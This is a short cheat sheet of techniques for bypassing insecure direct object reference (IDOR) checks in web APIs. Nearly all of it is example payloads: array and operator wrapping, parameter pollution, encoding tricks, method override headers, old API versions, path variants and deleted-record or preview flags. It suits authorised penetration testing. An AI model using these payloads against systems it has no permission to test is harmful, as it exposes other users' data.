# IDOR Bypasses

## Parameter Manipulation

### Wrap in Array
```json
// Blocked
{"id": 124}

// Bypass
{"id": [124]}
{"id": {"$eq": 124}}
```

### JSON vs Form
```http
// Blocked as JSON
Content-Type: application/json
{"user_id": 124}

// Try as form
Content-Type: application/x-www-form-urlencoded
user_id=124
```

### Parameter Pollution
```http
// First wins
?id=123&id=124

// Last wins
?id=123&id=124

// Array syntax
?id[]=123&id[]=124
```

## Encoding Tricks

### URL Encoding
```
/users/124 → /users/%31%32%34
```

### Double Encoding
```
/users/124 → /users/%2531%2532%2534
```

### Unicode
```
/users/124 → /users/①②④
```

## HTTP Method Switch

```http
// GET blocked
GET /api/users/124 → 403

// Try POST with method override
POST /api/users/124
X-HTTP-Method-Override: GET
```

## Version Bypass

```http
// v2 has checks
GET /api/v2/users/124 → 403

// v1 might not
GET /api/v1/users/124 → 200
GET /api/users/124 → 200  # No version
```

## Endpoint Variations

```http
// Blocked
/api/users/124

// Alternatives
/api/user/124
/api/Users/124
/api/users/124/
/api/users/124.json
/users/124
/graphql  # Different auth
```

## Reference Swapping

### In Nested Objects
```json
{
  "order": {
    "id": 999,
    "user_id": 124  // Attacker changes this
  }
}
```

### Wildcard/Glob
```http
GET /api/users/*/profile
GET /api/users/../124/profile
```

## State-Based Bypass

### Deleted Objects
```http
// Active user blocked
GET /api/users/124 → 403

// Deleted user accessible
GET /api/users/124?include_deleted=true → 200
```

### Draft/Preview Mode
```http
GET /api/documents/999?preview=true
GET /api/documents/999?draft=true
```

## Tips

1. **Try all HTTP methods** - GET, POST, PUT, PATCH, DELETE
2. **Check mobile endpoints** - Often less hardened
3. **Look for indirect references** - Files, exports, reports
4. **Chain with other vulns** - Info disclosure → IDOR
5. **Test across user types** - Free vs paid, user vs admin
